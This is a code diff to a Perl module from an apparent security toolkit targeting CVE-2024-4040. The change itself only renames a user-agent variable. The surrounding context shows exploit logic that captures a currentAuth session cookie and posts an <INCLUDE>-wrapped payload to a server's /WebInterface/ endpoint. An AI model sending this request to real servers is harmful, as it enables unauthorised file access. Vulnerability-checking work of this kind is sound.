@@ -26,12 +26,12 @@ package Spellbook::Advisory::CVE_2024_4040 {
             }
 
             my $endpoint   = "$target/WebInterface/";
-            my $userAgent  = Spellbook::Core::UserAgent -> new();
+            my $user_agent  = Spellbook::Core::UserAgent -> new();
             my $cookie_jar = HTTP::Cookies -> new();
 
-            $userAgent -> cookie_jar($cookie_jar);
+            $user_agent -> cookie_jar($cookie_jar);
 
-            my $response = $userAgent -> post($endpoint);
+            my $response = $user_agent -> post($endpoint);
 
             $cookie_jar -> extract_cookies($response);
             $cookie_jar -> save();
@@ -39,7 +39,7 @@ package Spellbook::Advisory::CVE_2024_4040 {
             my $cookies = $response -> header("Set-Cookie");
 
             if ($cookies =~ /currentAuth=([^;]+)/msx) {
-                $response = $userAgent -> post($endpoint,
+                $response = $user_agent -> post($endpoint,
                     Content_Type => "application/x-www-form-urlencoded",
                     Content => "command=exists&paths=<INCLUDE>$payload</INCLUDE>&c2f=$1"
                 );
